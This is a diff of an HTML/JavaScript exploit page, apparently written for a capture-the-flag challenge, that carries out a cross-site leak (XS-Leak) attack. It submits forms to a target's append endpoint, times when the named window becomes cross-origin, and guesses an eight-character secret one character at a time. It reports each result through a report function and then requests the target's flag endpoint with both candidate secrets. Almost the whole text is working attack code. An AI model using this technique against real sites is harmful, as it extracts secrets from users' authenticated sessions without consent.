@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><title>XS-Leak Form-based</title></head>
+<head><title>XS-Leak Object</title></head>
 <body>
 <div id="s">Loading...</div>
 <script>
@@ -15,12 +15,15 @@ const report = d => {
 };
 const status = s => document.getElementById('s').textContent = s;
 
-// Use form submission - bypasses popup blocker!
-async function measure(prefix) {
+// One-shot oracle using timing with performance API
+async function testPrefix(prefix) {
     const url = `${TARGET}/append?content=${encodeURIComponent(prefix)}&url=${encodeURIComponent(TARGET + "/")}`;
     const wname = 'p' + Math.random().toString(36).slice(2);
     
     return new Promise(resolve => {
+        // Clear performance entries
+        performance.clearResourceTimings();
+        
         const form = document.createElement('form');
         form.method = 'GET';
         form.action = url;
@@ -31,86 +34,103 @@ async function measure(prefix) {
         const t0 = performance.now();
         form.submit();
         
-        setTimeout(() => {
-            const elapsed = performance.now() - t0;
-            document.body.removeChild(form);
-            try { window.open('', wname).close(); } catch(e) {}
-            resolve(elapsed);
-        }, 700);
+        // Check when window becomes cross-origin (loaded)
+        let checks = 0;
+        const checkInterval = setInterval(() => {
+            checks++;
+            try {
+                const w = window.open('', wname);
+                if (w) {
+                    try {
+                        // If we can access location, still loading about:blank or same origin
+                        const loc = w.location.href;
+                        if (loc && loc !== 'about:blank' && !loc.startsWith(location.origin)) {
+                            // Loaded different origin
+                            clearInterval(checkInterval);
+                            w.close();
+                            resolve(performance.now() - t0);
+                            return;
+                        }
+                    } catch(e) {
+                        // Cross-origin - page loaded!
+                        clearInterval(checkInterval);
+                        const elapsed = performance.now() - t0;
+                        try { w.close(); } catch(e2) {}
+                        resolve(elapsed);
+                        return;
+                    }
+                }
+            } catch(e) {}
+            
+            if (checks > 100) {
+                clearInterval(checkInterval);
+                resolve(performance.now() - t0);
+            }
+        }, 10);
+        
+        document.body.removeChild(form);
     });
 }
 
-async function avg(prefix, n = 10) {
-    const times = [];
-    for (let i = 0; i < n; i++) {
-        times.push(await measure(prefix));
-        await sleep(50);
-    }
-    times.sort((a, b) => a - b);
-    const t = times.slice(2, -2);
-    return t.length ? t.reduce((a, b) => a + b, 0) / t.length : times[Math.floor(times.length/2)];
-}
-
-async function calibrate() {
-    status('Calibrating...');
-    report('CAL_START_FORM');
+// Since each append adds to notes, we can only test each prefix ONCE
+// Strategy: test all 16 chars for position, pick the fastest (or slowest)
+async function findCharAtPosition(knownPrefix, pos) {
+    status(`Testing position ${pos}...`);
     
-    const t200 = await avg("", 15);
-    const t404 = await avg("ZZZZZ", 15);
+    const results = [];
     
-    report(`CAL:200=${t200.toFixed(0)},404=${t404.toFixed(0)}`);
-    status(`200=${t200.toFixed(0)}ms, 404=${t404.toFixed(0)}ms`);
-    
-    return t200 < t404;
-}
-
-async function findSecret(faster) {
-    let secret = "";
-    
-    for (let pos = 0; pos < 8; pos++) {
-        status(`Pos ${pos+1}/8: ${secret}`);
-        
-        const results = [];
-        for (const c of CHARS) {
-            const t = await avg(secret + c, 8);
-            results.push({ c, t });
-        }
-        
-        results.sort((a, b) => a.t - b.t);
-        const top3 = results.slice(0, 3).map(r => `${r.c}:${r.t.toFixed(0)}`).join(',');
-        report(`P${pos}:${top3}`);
-        
-        const winner = faster ? results[0].c : results[results.length - 1].c;
-        secret += winner;
-        report(`P${pos}=${winner}|${secret}`);
+    for (const c of CHARS) {
+        const prefix = knownPrefix + c;
+        const time = await testPrefix(prefix);
+        results.push({ c, time });
+        report(`T${pos}_${c}:${time.toFixed(0)}`);
+        await sleep(100);
     }
     
-    return secret;
+    // Sort by time
+    results.sort((a, b) => a.time - b.time);
+    
+    // Report top and bottom
+    const fastest = results[0];
+    const slowest = results[results.length - 1];
+    report(`P${pos}_FAST:${fastest.c}:${fastest.time.toFixed(0)}_SLOW:${slowest.c}:${slowest.time.toFixed(0)}`);
+    
+    // We don't know which is correct, return both
+    return { fastest: fastest.c, slowest: slowest.c, results };
 }
 
 async function main() {
-    report('STARTED_FORM_V2');
-    status('Starting...');
+    report('STARTED_ONESHOT');
+    status('Starting one-shot XS-Leak...');
     
     try {
-        const faster = await calibrate();
-        report(`FASTER=${faster}`);
+        let secretFast = "";
+        let secretSlow = "";
         
-        const secret = await findSecret(faster);
-        report(`SECRET:${secret}`);
-        
-        const r = await fetch(`${TARGET}/flag?secret=${secret}`);
-        const flag = await r.text();
-        report(`FLAG1:${flag}`);
-        status(`FLAG: ${flag}`);
-        
-        if (!flag.includes('lactf')) {
-            report('TRY_INV');
-            const secret2 = await findSecret(!faster);
-            const r2 = await fetch(`${TARGET}/flag?secret=${secret2}`);
-            const flag2 = await r2.text();
-            report(`FLAG2:${flag2}`);
+        for (let pos = 0; pos < 8; pos++) {
+            // We test with EMPTY prefix each time to avoid cache
+            // But we need to build the prefix correctly
+            const result = await findCharAtPosition(secretFast, pos);
+            secretFast += result.fastest;
+            secretSlow += result.slowest;
+            
+            report(`POS${pos}:F=${secretFast},S=${secretSlow}`);
+            status(`Pos ${pos}: fast=${secretFast}, slow=${secretSlow}`);
         }
+        
+        report(`DONE:FAST=${secretFast},SLOW=${secretSlow}`);
+        
+        // Try both secrets
+        const r1 = await fetch(`${TARGET}/flag?secret=${secretFast}`);
+        const flag1 = await r1.text();
+        report(`FLAG_FAST:${flag1}`);
+        
+        const r2 = await fetch(`${TARGET}/flag?secret=${secretSlow}`);
+        const flag2 = await r2.text();
+        report(`FLAG_SLOW:${flag2}`);
+        
+        status(`Tried: ${secretFast} -> ${flag1}, ${secretSlow} -> ${flag2}`);
+        
     } catch(e) {
         report(`ERR:${e.message}`);
     }
